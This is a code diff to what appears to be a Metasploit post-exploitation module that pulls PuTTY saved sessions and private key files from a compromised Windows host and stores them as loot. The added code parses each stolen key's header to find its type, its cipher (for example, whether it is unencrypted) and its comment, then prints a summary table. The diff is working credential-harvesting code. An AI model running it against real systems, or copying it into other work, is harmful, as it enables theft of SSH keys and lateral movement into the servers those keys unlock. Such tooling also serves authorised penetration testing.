@@ -16,6 +16,7 @@ class Metasploit3 < Msf::Post
 
   INTERESTING_KEYS = ['HostName', 'PublicKeyFile', 'UserName', 'PortNumber', 'PortForwardings']
   PAGEANT_REGISTRY_KEY = "HKCU\\Software\\SimonTatham\\PuTTY"
+  PUTTY_PRIVATE_KEY_ANALYSIS = ['Name','HostName','PublicKeyFile','Type','Cipher','Comment']
 
   def initialize(info = {})
     super(update_info(info,
@@ -72,6 +73,29 @@ class Metasploit3 < Msf::Post
     print_line results_table.to_s
     stored_path = store_loot('putty.sessions.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Saved Sessions List")
     print_status("PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).")
+  end
+
+  def display_private_key_analysis(info)
+    # Results table holds raw string data
+    results_table = Rex::Ui::Text::Table.new(
+      'Header'     => "PuTTY Private Keys",
+      'Indent'     => 1,
+      'SortIndex'  => -1,
+      'Columns'    => ['Name','HostName','PublicKeyFile','Type','Cipher','Comment']
+    )
+
+    info.each do |result|
+      row = []
+      PUTTY_PRIVATE_KEY_ANALYSIS.each do |key|
+        row << result[key]
+      end
+      results_table << row
+    end
+
+    print_line
+    print_line results_table.to_s
+    #stored_path = store_loot('putty.sessions.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Saved Sessions List")
+    #print_status("PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).")
   end
 
   def get_stored_host_key_details(allkeys)
@@ -135,6 +159,7 @@ class Metasploit3 < Msf::Post
   end
 
   def grab_private_keys(sessions)
+    private_key_summary = []
     sessions.each do |ses|
       filename = ses['PublicKeyFile'].to_s
       next if filename.empty?
@@ -145,6 +170,41 @@ class Metasploit3 < Msf::Post
         if ppk # Attempt to read the contents of the file
           stored_path = store_loot('putty.ppk.file', 'application/octet-stream', session, ppk)
           print_good("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) saved to: #{stored_path}")
+
+          # Now analyse the private key
+          private_key = {}
+          private_key['Name'] = ses['Name']
+          private_key['HostName'] = ses['HostName']
+          private_key['PublicKeyFile'] = ses['PublicKeyFile']
+          private_key['Type'] = ''
+          private_key['Cipher'] = ''
+          private_key['Comment'] = ''
+
+          # Get type of key
+          if ppk.to_s =~ /^SSH PRIVATE KEY FILE FORMAT 1.1/
+            # This is an SSH1 header
+            private_key['Type'] = 'ssh1'
+            if ppk[33] == "\x00"
+                private_key['Cipher'] = 'none'
+            elsif ppk[33] == "\x03"
+                private_key['Cipher'] = '3DES'
+            else
+                private_key['Cipher'] = '(Unrecognised)'
+            end
+          elsif rx = /^PuTTY-User-Key-File-2:\sssh-(?<keytype>rsa|dss)[\r\n]/.match(ppk.to_s)
+            # This is an SSH2 header
+            private_key['Type'] = "ssh2 (#{rx[:keytype]})"
+            if rx = /^Encryption:\s(?<cipher>[-a-z0-9]+?)[\r\n]/.match(ppk.to_s)
+                private_key['Cipher'] = rx[:cipher]
+            else
+                private_key['Cipher'] = '(Unrecognised)'
+            end
+
+            if rx = /^Comment:\s(?<comment>.+?)[\r\n]/.match(ppk.to_s)
+                private_key['Comment'] = rx[:comment]
+            end
+          end
+          private_key_summary << private_key
         else
           print_error("Unable to read PuTTY private key file for \'#{ses['Name']}\' (#{filename})") # May be that we do not have permissions etc
         end
@@ -152,6 +212,7 @@ class Metasploit3 < Msf::Post
         print_error("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) could not be read.")
       end
     end
+    private_key_summary
   end
 
   # Entry point
@@ -172,8 +233,11 @@ class Metasploit3 < Msf::Post
 
       # If the private key file has been configured, retrieve it and save it to loot
       print_status("Downloading private keys...")
-      grab_private_keys(all_saved_sessions)
-
+      private_key_info = grab_private_keys(all_saved_sessions)
+      if (!private_key_info.nil? && !private_key_info.empty?)
+        print_line
+        display_private_key_analysis(private_key_info) 
+      end
     end
 
     print_line # Just for readability
